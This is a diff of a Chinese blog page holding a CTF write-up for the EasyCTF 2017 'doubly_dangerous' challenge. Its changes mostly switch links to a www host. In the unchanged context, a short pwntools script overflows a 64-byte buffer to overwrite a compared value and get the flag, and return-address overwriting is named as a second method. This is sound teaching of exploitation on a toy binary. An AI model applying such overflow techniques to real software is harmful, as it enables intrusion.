@@ -92,7 +92,7 @@
 <meta name="keywords" content="PWN,CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="EasyCTF 2017-doubly_dangerous writeup">
-<meta property="og:url" content="https://hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/index.html">
+<meta property="og:url" content="https://www.hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/index.html">
 <meta property="og:site_name" content="Hvnt3r&#39;s Blog">
 <meta property="og:description" content="题目下载链接 拿到题目还是先看一下基本信息： 12☁  EasyCTF 2017-doubly_dangerous  file doubly_dangerous doubly_dangerous: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-lin">
 <meta property="og:locale" content="zh-CN">
@@ -134,7 +134,7 @@
 
 
 
-  <link rel="canonical" href="https://hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/">
+  <link rel="canonical" href="https://www.hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/">
 
 
 
@@ -289,7 +289,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/">
+    <link itemprop="mainEntityOfPage" href="https://www.hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hvnt3r">
@@ -429,7 +429,7 @@
 <p>查看十六进制的数值</p>
 <p><img src="https://i.loli.net/2018/10/15/5bc47e17b54ef.png" alt></p>
 <p>从而得到我们要的数据<code>0x00803441</code>，但是系统采用的是大端序因而这个值为<code>0x41348000</code></p>
-<p>因为之前写的文章里又不少详细的介绍比如<a href="https://hvnt3r.top/2018/10/2018%E6%8A%A4%E7%BD%91%E6%9D%AFPWN%E9%A2%98%E8%A7%A3/">这个</a>，这里就直接放脚本了：</p>
+<p>因为之前写的文章里又不少详细的介绍比如<a href="https://hvnt3r.top/2018/10/2018%E6%8A%A4%E7%BD%91%E6%9D%AFPWN%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">这个</a>，这里就直接放脚本了：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./doubly_dangerous"</span>)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=<span class="string">"A"</span>*<span class="number">64</span>+p32(<span class="number">0x41348000</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
 <p><strong>解法二</strong></p>
 <p>通过缓冲区溢出修改<code>get</code>函数的返回地址，使程序转到<code>give_flag()</code>函数</p>
@@ -487,7 +487,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link:</strong>
-    <a href="https://hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/" title="EasyCTF 2017-doubly_dangerous writeup">https://hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/</a>
+    <a href="https://www.hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/" title="EasyCTF 2017-doubly_dangerous writeup">https://www.hvnt3r.top/2018/10/EasyCTF-2017-doubly-dangerous-writeup/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice: </strong>
